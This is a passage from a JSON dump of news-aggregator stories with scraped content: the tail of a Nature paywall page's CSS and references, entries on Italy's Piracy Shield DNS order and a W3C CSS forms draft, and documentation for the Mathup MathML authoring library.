justify-content: flexStart;\n            left: auto;\n            letter-spacing: normal;\n            line-break: auto;\n            line-height: normal;\n            list-style-image: none;\n            list-style-position: outside;\n            list-style-type: disc;\n            margin-block-end: 0;\n            margin-block-start: 0;\n            margin-bottom: 0;\n            margin-inline-end: 0;\n            margin-inline-start: 0;\n            margin-left: 0;\n            margin-right: 0;\n            margin-top: 0;\n            mask-clip: borderBox;\n            mask-composite: add;\n            mask-image: none;\n            mask-mode: matchSource;\n            mask-origin: borderBox;\n            mask-position: 0 0;\n            mask-repeat: repeat;\n            mask-size: auto;\n            mask-type: luminance;\n            max-height: none;\n            max-width: none;\n            min-block-size: 0;\n            min-height: 0;\n            min-inline-size: 0;\n            min-width: 0;\n            mix-blend-mode: normal;\n            object-fit: fill;\n            object-position: 50% 50%;\n            offset-block-end: auto;\n            offset-block-start: auto;\n            offset-inline-end: auto;\n            offset-inline-start: auto;\n            opacity: 1;\n            order: 0;\n            orphans: 2;\n            outline-color: initial;\n            outline-offset: 0;\n            outline-style: none;\n            outline-width: medium;\n            overflow: visible;\n            overflow-wrap: normal;\n            overflow-x: visible;\n            overflow-y: visible;\n            padding-block-end: 0;\n            padding-block-start: 0;\n            padding-bottom: 0;\n            padding-inline-end: 0;\n            padding-inline-start: 0;\n            padding-left: 0;\n            padding-right: 0;\n            padding-top: 0;\n            page-break-after: auto;\n            page-break-before: auto;\n            page-break-inside: auto;\n            perspective: none;\n            perspective-origin: 50% 50%;\n            pointer-events: auto;\n            position: static;\n            quotes: initial;\n            resize: none;\n            right: auto;\n            ruby-align: spaceAround;\n            ruby-merge: separate;\n            ruby-position: over;\n            scroll-behavior: auto;\n            scroll-snap-coordinate: none;\n            scroll-snap-destination: 0 0;\n            scroll-snap-points-x: none;\n            scroll-snap-points-y: none;\n            scroll-snap-type: none;\n            shape-image-threshold: 0;\n            shape-margin: 0;\n            shape-outside: none;\n            tab-size: 8;\n            table-layout: auto;\n            text-align: initial;\n            text-align-last: auto;\n            text-combine-upright: none;\n            text-decoration-color: currentcolor;\n            text-decoration-line: none;\n            text-decoration-style: solid;\n            text-emphasis-color: currentcolor;\n            text-emphasis-position: over right;\n            text-emphasis-style: none;\n            text-indent: 0;\n            text-justify: auto;\n            text-orientation: mixed;\n            text-overflow: clip;\n            text-rendering: auto;\n            text-shadow: none;\n            text-transform: none;\n            text-underline-position: auto;\n            top: auto;\n            touch-action: auto;\n            transform: none;\n            transform-box: borderBox;\n            transform-origin: 50% 50%0;\n            transform-style: flat;\n            transition-delay: 0s;\n            transition-duration: 0s;\n            transition-property: all;\n            transition-timing-function: ease;\n            vertical-align: baseline;\n            visibility: visible;\n            white-space: normal;\n            widows: 2;\n            width: auto;\n            will-change: auto;\n            word-break: normal;\n            word-spacing: normal;\n            word-wrap: normal;\n            writing-mode: horizontalTb;\n            z-index: auto;\n            -webkit-appearance: none;\n            -moz-appearance: none;\n            -ms-appearance: none;\n            appearance: none;\n            margin: 0;\n          }\n          .LiveAreaSection {\n            width: 100%;\n          }\n          .LiveAreaSection .login-option-buybox {\n            display: block;\n            width: 100%;\n            font-size: 17px;\n            line-height: 30px;\n            color: #222;\n            padding-top: 30px;\n            font-family: Harding, Palatino, serif;\n          }\n          .LiveAreaSection .additional-access-options {\n            display: block;\n            font-weight: 700;\n            font-size: 17px;\n            line-height: 30px;\n            color: #222;\n            font-family: Harding, Palatino, serif;\n          }\n          .LiveAreaSection .additional-login > li:not(:first-child)::before {\n            transform: translateY(-50%);\n            content: \"\";\n            height: 1rem;\n            position: absolute;\n            top: 50%;\n            left: 0;\n            border-left: 2px solid #999;\n          }\n          .LiveAreaSection .additional-login > li:not(:first-child) {\n            padding-left: 10px;\n          }\n          .LiveAreaSection .additional-login > li {\n            display: inline-block;\n            position: relative;\n            vertical-align: middle;\n            padding-right: 10px;\n          }\n          .BuyBoxSection {\n            display: flex;\n            flex-wrap: wrap;\n            flex: 1;\n            flex-direction: row-reverse;\n            margin: -30px -15px 0;\n          }\n          .BuyBoxSection .box-inner {\n            width: 100%;\n            height: 100%;\n            padding: 30px 5px;\n            display: flex;\n            flex-direction: column;\n            justify-content: space-between;\n          }\n          .BuyBoxSection p {\n            margin: 0;\n          }\n          .BuyBoxSection .readcube-buybox {\n            background-color: #f3f3f3;\n            flex-shrink: 1;\n            flex-grow: 1;\n            flex-basis: 255px;\n            background-clip: content-box;\n            padding: 0 15px;\n            margin-top: 30px;\n          }\n          .BuyBoxSection .subscribe-buybox {\n            background-color: #f3f3f3;\n            flex-shrink: 1;\n            flex-grow: 4;\n            flex-basis: 300px;\n            background-clip: content-box;\n            padding: 0 15px;\n            margin-top: 30px;\n          }\n          .BuyBoxSection .subscribe-buybox-nature-plus {\n            background-color: #f3f3f3;\n            flex-shrink: 1;\n            flex-grow: 4;\n            flex-basis: 100%;\n            background-clip: content-box;\n            padding: 0 15px;\n            margin-top: 30px;\n          }\n          .BuyBoxSection .title-readcube,\n          .BuyBoxSection .title-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 10%;\n            margin-left: 10%;\n            font-size: 24px;\n            line-height: 32px;\n            color: #222;\n            text-align: center;\n            font-family: Harding, Palatino, serif;\n          }\n          .BuyBoxSection .title-asia-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 5%;\n            margin-left: 5%;\n            font-size: 24px;\n            line-height: 32px;\n            color: #222;\n            text-align: center;\n            font-family: Harding, Palatino, serif;\n          }\n          .BuyBoxSection .asia-link,\n          .Link-328123652,\n          .Link-2926870917,\n          .Link-2291679238,\n          .Link-595459207 {\n            color: #069;\n            cursor: pointer;\n            text-decoration: none;\n            font-size: 1.05em;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 1.05em6;\n          }\n          .BuyBoxSection .access-readcube {\n            display: block;\n            margin: 0;\n            margin-right: 10%;\n            margin-left: 10%;\n            font-size: 14px;\n            color: #222;\n            padding-top: 10px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection ul {\n            margin: 0;\n          }\n          .BuyBoxSection .link-usp {\n            display: list-item;\n            margin: 0;\n            margin-left: 20px;\n            padding-top: 6px;\n            list-style-position: inside;\n          }\n          .BuyBoxSection .link-usp span {\n            font-size: 14px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .access-asia-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 5%;\n            margin-left: 5%;\n            font-size: 14px;\n            color: #222;\n            padding-top: 10px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .access-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 10%;\n            margin-left: 10%;\n            font-size: 14px;\n            color: #222;\n            opacity: 0.8px;\n            padding-top: 10px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .price-buybox {\n            display: block;\n            font-size: 30px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            padding-top: 30px;\n            text-align: center;\n          }\n          .BuyBoxSection .price-buybox-to {\n            display: block;\n            font-size: 30px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            text-align: center;\n          }\n          .BuyBoxSection .price-info-text {\n            font-size: 16px;\n            padding-right: 10px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .price-value {\n            font-size: 30px;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .price-per-period {\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .price-from {\n            font-size: 14px;\n            padding-right: 10px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection .issue-buybox {\n            display: block;\n            font-size: 13px;\n            text-align: center;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 19px;\n          }\n          .BuyBoxSection .no-price-buybox {\n            display: block;\n            font-size: 13px;\n            line-height: 18px;\n            text-align: center;\n            padding-right: 10%;\n            padding-left: 10%;\n            padding-bottom: 20px;\n            padding-top: 30px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n          }\n          .BuyBoxSection .vat-buybox {\n            display: block;\n            margin-top: 5px;\n            margin-right: 20%;\n            margin-left: 20%;\n            font-size: 11px;\n            color: #222;\n            padding-top: 10px;\n            padding-bottom: 15px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 17px;\n          }\n          .BuyBoxSection .tax-buybox {\n            display: block;\n            width: 100%;\n            color: #222;\n            padding: 20px 16px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: NaNpx;\n          }\n          .BuyBoxSection .button-container {\n            display: flex;\n            padding-right: 20px;\n            padding-left: 20px;\n            justify-content: center;\n          }\n          .BuyBoxSection .button-container > * {\n            flex: 1px;\n          }\n          .BuyBoxSection .button-container > a:hover,\n          .Button-505204839:hover,\n          .Button-1078489254:hover,\n          .Button-2737859108:hover {\n            text-decoration: none;\n          }\n          .BuyBoxSection .btn-secondary {\n            background: #fff;\n          }\n          .BuyBoxSection .button-asia {\n            background: #069;\n            border: 1px solid #069;\n            border-radius: 0;\n            cursor: pointer;\n            display: block;\n            padding: 9px;\n            outline: 0;\n            text-align: center;\n            text-decoration: none;\n            min-width: 80px;\n            margin-top: 75px;\n          }\n          .BuyBoxSection .button-label-asia,\n          .ButtonLabel-3869432492,\n          .ButtonLabel-3296148077,\n          .ButtonLabel-1636778223 {\n            display: block;\n            color: #fff;\n            font-size: 17px;\n            line-height: 20px;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            text-align: center;\n            text-decoration: none;\n            cursor: pointer;\n          }\n          .Button-505204839,\n          .Button-1078489254,\n          .Button-2737859108 {\n            background: #069;\n            border: 1px solid #069;\n            border-radius: 0;\n            cursor: pointer;\n            display: block;\n            padding: 9px;\n            outline: 0;\n            text-align: center;\n            text-decoration: none;\n            min-width: 80px;\n            max-width: 320px;\n            margin-top: 20px;\n          }\n          .Button-505204839 .btn-secondary-label,\n          .Button-1078489254 .btn-secondary-label,\n          .Button-2737859108 .btn-secondary-label {\n            color: #069;\n          }\n          .uList-2102244549 {\n            list-style: none;\n            padding: 0;\n            margin: 0;\n          }\n          /* style specs end */\n\n    Additional access options:\n\n            Log in\n\n            Learn about institutional subscriptions\n\n            Read our FAQs\n\n            Contact customer support\n\n                doi: https://doi.org/10.1038/d41586-025-00764-2\n\n                ReferencesLipson, M. et al. Nature https://doi.org/10.1038/s41586-025-08699-4 (2025).Article\n\n                    Google Scholar\n                Fregel, R. et al. Proc. Natl Acad. Sci. USA 115, 6774–6779 (2018).Article\n    PubMed\n\n                    Google Scholar\n                Simões, L. G. et al. Nature 618, 550–556 (2023).Article\n    PubMed\n\n                    Google Scholar\n                Download references\n\n                    Reprints and permissions\n\n                Subjects\n\n                Evolution\n\n                Genomics\n\n                Agriculture\n\n    Latest on:\n\n                Evolution\n\n                                    Long-term studies provide unique insights into evolution\n                                    Review Article 19 MAR 25\n\n                                    Drivers of avian genomic change revealed by evolutionary rate decomposition\n                                    Article 19 MAR 25\n\n                                    Fossilized dinosaur cells that defied the ravages of time — 20 years since a key discovery\n                                    News & Views 17 MAR 25\n\n                Genomics\n\n                                    Mutations that accrue through life set the stage for stomach cancer\n                                    News & Views 19 MAR 25\n\n                                    Spatially resolved mapping of cells associated with human complex traits\n                                    Article 19 MAR 25\n\n                                    The somatic mutation landscape of normal gastric epithelium\n                                    Article 19 MAR 25\n\n                Agriculture\n\n                                    Fate of pistachio production in Iran holds lessons for the world\n                                    Correspondence 11 MAR 25\n\n                                    Genus-wide plant pangenome could inform next-generation crop design\n                                    News & Views 05 MAR 25\n\n                                    Why farmers are beginning to take their government to court over climate change\n                                    Comment 28 JAN 25\n\n                                    Long-term studies provide unique insights into evolution\n                                    Review Article 19 MAR 25\n\n                                    Drivers of avian genomic change revealed by evolutionary rate decomposition\n                                    Article 19 MAR 25\n\n                                    Fossilized dinosaur cells that defied the ravages of time — 20 years since a key discovery\n                                    News & Views 17 MAR 25\n\n            Jobs\n\n                        New Positions open for the laser science center in Peking University\n\n                            The Beijing Laser Accelerator Innovation Center at Peking University invites applications for Applied Physics faculty.\n                            Beijing, China\n                            Peking University (PKU)\n\n                        Department Chair for Biomedical Engineering / University of Utah\n\n                            The recently endowed John and Marcia Price College of Engineering at the University of Utah is now accepting applications\n                            Salt Lake City, Utah\n                            University of Utah Biomedical Engineering\n\n                        Research Associate\n\n                            We are seeking an experienced and motivated Research Associate to join our dynamic research team in the Douglas Lab!\n                            Dallas, Texas (US)\n                            UT Southwestern Medical Center - Douglas Laboratory\n\n                        Postdoctoral Researcher in Brain-Computer Interaction, Neuromodulation, and Clinical Applications\n\n                            Join a cutting-edge research team in brain-computer interaction and neuromodulation for clinical applications.\n                            Shanghai, China\n                            Fudan University\n\n                        Schaller Research Group Leader Positions in Infectious Diseases at Heidelberg University\n\n                            Applications are invited for additional Schaller Research Group Leaders in the field of infectious diseases\n                            Heidelberg, Baden-Württemberg (DE)\n                            The Chica and Heinz Schaller Foundation",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e2aca39a1f826fca",
    "title": {
      "en": "Italy demands Google poison DNS under strict Piracy Shield law",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/gadgets/2025/03/italian-court-orders-google-to-block-iptv-pirate-sites-at-dns-level/",
    "score": 158,
    "by": "DanAtC",
    "time": 1742672764,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "f6626717cb52e977",
    "title": {
      "en": "CSS Form Control Styling Level 1 – W3C First Public Working Draft",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://drafts.csswg.org/css-forms/",
    "score": 4,
    "by": "tambourine_man",
    "time": 1742691330,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "530d84be27c89db3",
    "title": {
      "en": "Mathup: Easy MathML authoring tool with a quick to write syntax",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://mathup.xyz/",
    "score": 122,
    "by": "runarberg",
    "time": 1742576537,
    "content": "Use\n\n                Installation\n                Usage\n                Options\n\n              Philosophy\n\n                    Quick to write / Easy to read\n\n                Why not just use MathJax\n                Why AsciiMath / Why not TeΧ\n\n              Reference\n\n                Reference\n                Basics\n                Numbers\n                Operators\n                Identifiers\n                Text\n                Spaces\n                Fractions\n\n                  Sub and superscripts\n\n                Fenced groups\n                Matrices\n                Tensors\n                Roots\n                Accents\n                Font commands\n                Colors\n\n              Open Source\n\n                  GitHub\n\n                    Bug Reports\n\n                    License (MIT)\n\n          Installation\n\n          npm\n\n          npm install mathup\n\n          import mathup from \"mathup\";\n\n          Client\n\n          Download one of the following:\n\n              Module (full,\n              min)\n\n              Script (full,\n              min)\n\n              Custom element as module (full,\n              min)\n\n              Custom element as script (full,\n              min)\n\n              Stylesheet (full; not needed for custom element)\n\n          …and include the module:\n\n          <script type=\"module\" src=\"mathup.js\"></script>\n<link rel=\"stylesheet\" href=\"mathup.css\" />\n\n          …the custom element:\n\n          <script type=\"module\" src=\"math-up-element.js\"></script>\n\n          …or the script:\n\n          <script src=\"mathup.iife.js\"></script>\n<link rel=\"stylesheet\" href=\"mathup.css\" />\n\n          Usage\n\n            const expression = \"1+1 = 2\";\nconst options = {};  // optional\nconst mathml = mathup(expression, options);\n\nmathml.toString();\n// => \"<math><mrow><mn>1</mn><mo>+</mo><mn>1</mn></mrow><mo>=</mo><mn>2</mn></math>\"\n\nconst mathNode = mathml.toDOM();\n// => [object MathMLElement]\n\n// Update existing <math> node in place\nmathup(\"3-2 = 1\", { bare: true }).updateDOM(mathNode);\n\n            Custom Element\n\n            <math-up\n  display=\"inline\"\n  dir=\"ltr\"\n  decimal-mark=\",\"\n  col-sep=\";\"\n  row-sep=\";;\"\n>\n  1+1 = 2\n</math-up>\n\n            Command line\n\n            npm install -g mathup\nmathup [options] -- <expression>\n\n# or from stdin\necho <expression> | mathup [options]\n\n          Options (with defaults)\n\n          const options = {\n  decimalMark: \".\",   // -m  --decimal-mark=\".\"\n  colSep: \",\",        // -c  --col-sep=\",\"\n  rowSep: \";\",        // -r  --row-sep=\";\"\n  display: \"inline\",  // -d  --display=\"inline\"\n  dir: \"ltr\",         //     --rtl\n  bare: false,        // -b  --bare\n};\n\n            Note: If you pick , as your decimal\n            mark then ; becomes the new default column separator.\n            And if ; is your column separator then the new default\n            row separator becomes ;;. You can use , as\n            both a decimal mark and a row separator if you\n            take care to add a space between the row separator and the following\n            digit. However then you must set both explicitly.\n\n          const options = {\n  decimalMark: \",\",\n  colSep: \",\",\n};\n\n          Quick to write / Easy to read\n\n            This package exposes a single function mathup\n            that intuitively takes simple mathematical expressions—written in a\n            markup language inspired by\n            AsciiMath—and outputs structured\n            MathML.\n\n            You can use it on the command line or on the server as a\n            node package, or in the browser by\n            including the script source. In the browser, you choose how to parse\n            the math in your document—by looking hard for any math-y substrings,\n            parsing all expressions wrapped in $…$, or\n            using some other excellent tools out there that does it for you. And\n            you can choose what to do with the output as well—piping it to\n            another program, inject it streight to the DOM, or just logging it\n            to the console.\n\n          Why not just use MathJax?\n\n            MathJax is an\n            excellent tool that you can safely use if all you want to do is\n            include complex mathematical expressions in a document. However,\n            MathJax is a complex piece of software that does a great deal more\n            than just translate simple expression into structured form, and if\n            that is all you want to do, then MathJax is definitely overkill.\n            Mathup promises to be a lot faster (by doing less) then MathJax.\n            While MathJax will search for expressions, parse them, translate,\n            and render them. Mathup only parses and translates them, and lets\n            the browser do the rendering.\n\n          Why AsciiMath / Why not TeΧ?\n\n            I wrote this tool, because I wanted to be able to author\n            mathematical expressions quickly, with no overhead (imagine\n            1/2 instead of \\frac{1}{2}). TeΧ\n            expressions can easily become verbose and annoying to write\n            (especially on keyboards with complex access to the \\,\n            {, and } keys). However, the purpose of this\n            package is not to give people complete control over MathML\n            in a non-verbose way, the purpose is to make it simple for people to\n            write simple expression. Of course I’ll try to give as much\n            expressive power as possible in the way, but I won’t promise to make\n            all complex things possible.\n\n            If you want full support of MathML, and don’t want to write all\n            those tags perhaps you should look for another tool. There are other\n            great efforts to enable people to author MathML in TeX format, take\n            a look at\n            TeXZilla for\n            example.\n\n        Reference\n\n          Basics\n\n            Mathup uses four of MathML’s token elements (identifiers\n            <mi>, operators <mo>, numbers\n            <mn> and text <mtext>). Mathup\n            recognizes which of these you mean when you write simple\n            expressions.\n\n          For example: 1+1 = 2 ⇒\n\n          <mrow>\n  <mn>1</mn>\n  <mo>+</mo>\n  <mn>1</mn>\n</mrow>\n<mo>=</mo>\n<mn>2</mn>\n\n          And sin theta ⇒\n\n          <mi>sin</mi><mi>θ</mi>\n\n            Mathup will also recognize most of the unicode characters you’ll\n            write. If a character comes from one of the mathematical operator\n            code blocks it will wrap it in an <mo> tag,\n            otherwise it will be wrapped in an <mi> tag.\n            Additionally d will be wrapped in an\n            <mo> tag if it obviously a part of a\n            differential.\n\n              x ∈ ℝ\n              α ∝ 1\n              π ≈ 3.141592654\n              1+1 = 2\n              3-2 = 1\n\n          Numbers\n\n            Numbers are usually what you think they are (including unicode\n            numerals like Ⅻ or ↋). However if you want to write a number\n            in an odd way (like spelling it out, as a hex string, or as a roman\n            numeral) you can prepend a string with #, (e.g.\n            #0x2A) or—if your number includes a non alphanumeric\n            character—prepend a backticked fence (like in markdown)\n            #`…`like so: #`forty two` or\n            #`` `42 `` to make `42 a number.\n\n                π ≈ ٣٫١٤١٥٩٢٦٥\n\n              (١٠ - ح)^٢ = ٨١ح\n              #`4.2e+01` = 4.2 xx 10^1 = 42\n\n                `rgb`(48, 148, 171) == #`#3094AB`\n\n          Operators\n\n            Anything in the Pc, Pd, Pe,\n            Pf, Pi, Po, Ps,\n            Sm, or So unicode categories is considered\n            an operator. Additionally the symbol character or alphanumeric\n            string immediately following a backslash \\ will become\n            an operator (<mo>). If you need more then one\n            symbol character, or more then one word, as a single operator in the\n            operator (e.g. <mo>for each</mo>), you can\n            fence it following markdown semantics; (e.g.\n            \\`for each` or \\`` ` `` for\n            <mo>`</mo>).\n\n          The following will also map to the respective operator.\n\n            Operational\n\n              .$\n\n                FUNCTION APPLICATION\n                (zero width)\n\n              .*\n\n                INVISIBLE TIMES\n                (zero width)\n\n              .+\n\n                INVISIBLE PLUS\n                (zero width)\n\n              lim\n\n                lim\n\n              mod\n\n                mod\n\n              -\n\n                −\n\n              +-\n\n                ±\n\n              -+\n\n                ∓\n\n              *\n\n                ·\n\n              xx\n\n                ×\n\n              -:\n\n                ÷\n\n              //\n\n                ⁄\n\n              prod\n\n                ∏\n\n              sum\n\n                ∑\n\n              **\n\n                ∗\n\n              @\n\n                ∘\n\n              ^^\n\n                ∧\n\n              vv\n\n                ∨\n\n              nn\n\n                ∩\n\n              uu\n\n                ∪\n\n              int\n\n                ∫\n\n              dint\n\n                ∬\n\n              oint\n\n                ∮\n\n              !=\n\n                ≠\n\n              !==\n\n                ≢\n\n              o+\n\n                ⊕\n\n              ox\n\n                ⊗\n\n              o.\n\n                ⊙\n\n              ^^^\n\n                ⋀\n\n              vvv\n\n                ⋁\n\n              nnn\n\n                ⋂\n\n              uuu\n\n                ⋃\n\n              ***\n\n                ⋆\n\n              |><|\n\n                ⋈\n\n              |><\n\n                ⋉\n\n              ><|\n\n                ⋊\n\n            Miscellaneous\n\n              '\n\n                ′\n\n              ''\n\n                ″\n\n              '''\n\n                ‴\n\n              ''''\n\n                ⁗\n\n              aleph\n\n                ℵ\n\n              del\n\n                ∂\n\n              grad\n\n                ∇\n\n              oc, prop\n\n                ∝\n\n              /_\n\n                ∠\n\n              /_\\\n\n                △\n\n              ||\n\n                ∥\n\n              ~=\n\n                ≅\n\n              ~~\n\n                ≈\n\n              sub\n\n                ⊂\n\n              sup\n\n                ⊃\n\n              sube\n\n                ⊆\n\n              supe\n\n                ⊇\n\n              <>, diamond\n\n                ⋄\n\n              [], square\n\n                □\n\n              <|\n\n                ⊲\n\n              |>\n\n                ⊳\n\n            Relational\n\n              in\n\n                ∈\n\n              !in\n\n                ∉\n\n                -=,\n                ==\n\n                ≡\n\n              <=\n\n                ≤\n\n              >=\n\n                ≥\n\n              -<\n\n                ≺\n\n              >-\n\n                ≻\n\n              -<=\n\n                ⪯\n\n              >-=\n\n                ⪰\n\n              <<<\n\n                ≪\n\n              >>>\n\n                ≫\n\n            Logical\n\n              and\n\n                and\n\n              if\n\n                if\n\n              or\n\n                or\n\n              otherwise\n\n                otherwise\n\n              not\n\n                ¬\n\n              AA\n\n                ∀\n\n              EE\n\n                ∃\n\n              |--\n\n                ⊢\n\n              TT\n\n                ⊤\n\n              _|_\n\n                ⊥\n\n              |==\n\n                ⊨\n\n            Arrows\n\n              <-, larr\n\n                ←\n\n              uarr\n\n                ↑\n\n              ->, rarr\n\n                →\n\n              darr\n\n                ↓\n\n              harr\n\n                ↔\n\n              ->>\n\n                ↠\n\n              >->\n\n                ↣\n\n              |->\n\n                ↦\n\n              lArr\n\n                ⇐\n\n              =>, rArr\n\n                ⇒\n\n                <=>, iff, hArr\n\n                ⇔\n\n              >->>\n\n                ⤖\n\n            Punctuations\n\n              .,\n\n                INVISIBLE SEPARATOR\n                (zero width)\n\n              ...\n\n                …\n\n              :.\n\n                ∴\n\n              vdots\n\n                ⋮\n\n              cdots\n\n                ⋯\n\n              ddots\n\n                ⋱\n\n                \\`lim sup`._(n -> oo) x_n\n\n                  sum_(n=0)^k a_n = a_0 + a_1 + cdots + a_k\n\n                  e = sum_(n=0)^oo 1 / n!\n\n                  bf F @ bf G  :  U sube RR^3 -> RR^2\n\n                  f'(x), f''(x), f'''(x), f''''(x)\n\n                  P_k(x) = f(a) + f'(a)(x-a) + f''(a) / 2! (x-a)^2 + cdots + f^(k)(a) / k! (x-a)^k\n\n                 f(a) - f(b) = int_b^a f'(x) dx\n\n                  grad f(x,y) = ((del f)/(del x) (x, y), (del f)/(del y)(x,y))\n\n                  oint_(del S) bf F * d bf s = dint_S grad xx bf F * d bf s\n\n          Identifiers\n\n            Anything not a number, operator, or text is considered an\n            identifier. This includes latin, greek or arabic letters\n            (A, π, ح) or even emoji. Each\n            character is considered a separate identifier unless they spell out\n            a word found in the tables below or the operator table above.\n\n            You can force any sequence of characters to be a single idendifier\n            by surrounding them in fences (e.g. `Gamma` yields\n            <mi>Gamma</mi> and\n            `` f` `` yields <mi>f`</mi>)\n\n          The following will also produce a single identifier:\n\n            Standard functions\n\n              cos\n\n                cos\n\n              cosh\n\n                cosh\n\n              cot\n\n                cot\n\n              csc\n\n                csc\n\n              cosec\n\n                cosec\n\n              det\n\n                det\n\n              dim\n\n                dim\n\n              gcd\n\n                gcd\n\n              lcm\n\n                lcm\n\n              ln\n\n                ln\n\n              log\n\n                log\n\n              max\n\n                max\n\n              min\n\n                min\n\n              mod\n\n                mod\n\n              sec\n\n                sec\n\n              sin\n\n                sin\n\n              sinh\n\n                sinh\n\n              tan\n\n                tan\n\n              tanh\n\n                tanh\n\n            Greek\n\n              Delta\n\n                Δ\n\n              Gamma\n\n                Γ\n\n              Lambda\n\n                Λ\n\n              Omega\n\n                Ω\n\n              Phi\n\n                Φ\n\n              Pi\n\n                Π\n\n              Psi\n\n                Ψ\n\n              Sigma\n\n                Σ\n\n              Theta\n\n                Θ\n\n              Xi\n\n                Ξ\n\n              alpha\n\n                α\n\n              beta\n\n                β\n\n              chi\n\n                χ\n\n              epsilon\n\n                ɛ\n\n              eta\n\n                η\n\n              gamma\n\n                γ\n\n              kappa\n\n                κ\n\n              lambda\n\n                λ\n\n              mu\n\n                μ\n\n              nu\n\n                ν\n\n              omega\n\n                ω\n\n              phi\n\n                φ\n\n              phiv\n\n                ϕ\n\n              pi\n\n                π\n\n              psi\n\n                ψ\n\n              rho\n\n                ρ\n\n              sigma\n\n                σ\n\n              tau\n\n                τ\n\n              theta\n\n                θ\n\n              upsilon\n\n                υ\n\n              xi\n\n                ξ\n\n              zeta\n\n                ζ\n\n            Additional identifiers\n\n              oo\n\n                ∞\n\n              O/\n\n                ∅\n\n              CC\n\n                ℂ\n\n              NN\n\n                ℕ\n\n              QQ\n\n                ℚ\n\n              RR\n\n                ℝ\n\n              ZZ\n\n                ℤ\n\n              tan = sin/cos\n              sinh x = (e^x - e^ -x) / 2\n              ln x/y = ln x - ln y\n\n                  `Gamma`(theta | alpha, beta) = beta^alpha / Gamma(alpha) theta^(alpha - 1) e^(-beta theta)\n\n              (🍔-🐄 / 🌈)^2 = 🥰\n              lim_(x->oo)\n              `sup`(O/) = -oo\n              min._(x in NN) = 0\n\n          Text\n\n            You can surround anything in double quotes (\"some text\") and it will get displayed as text. If your text annotation\n            contains a quote mark you can surround it with more quotemarks (just\n            like with backtick fences). That is\n            \"\" \"text string\" \"\" will give you\n            <mtext>\"text string\"</mtext>.\n\n                  obrace(a\\`↑↑`b = ubrace(a^a^⋰^a)._(b  \"times\")).^\"\" \"up-arrow\" notation \"\"\n\n          Spaces\n\n            MathML has an element called <mspace>. Two or\n            more spaces in a row will be translated into that element where it\n            makes sense. The width of the space will be:\n\n          \"width\" = { 0.35(n - 1)\\,, if n = 2 or n = 3\n                        0.5(n - 1)\\,,  if n = 4 or n = 5\n                        n - 3\\,,       if n > 5\n\n            Where n is the number of subsequent spaces and\n            width is in units of ex which is\n            the height of the ‘x’ character in your font.\n\n            In addition (mod p) will add 1.65ex\n            of space to the left of the open parenthesis.\n\n                  bb P(x) = 1,     \\for 0 ≤ x ≤ 1\n\n                a^(p-1) == 1  (mod p)\n\n                  QQ = {p, q in 